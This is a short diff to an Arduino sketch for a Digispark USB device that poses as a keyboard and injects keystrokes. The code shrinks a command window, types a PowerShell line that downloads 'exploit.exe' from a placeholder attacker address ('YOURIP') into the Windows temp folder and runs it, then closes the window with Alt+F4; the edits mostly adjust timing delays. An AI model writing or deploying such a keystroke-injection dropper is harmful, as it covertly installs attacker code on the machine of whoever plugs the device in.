@@ -50,16 +50,14 @@ pisca_led(100);
   DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(3000);
-  DigiKeyboard.print("\t\t");
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(1500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("cmd /c powershell -Command wget 'http://YOURIP/exploit.exe' -Outfile c:/windows/temp/exploit.exe ; c:/windows/temp/exploit.exe");
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
+  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
   //
  pisca_led(1000); 
   for(;;){ /*empty*/ } 
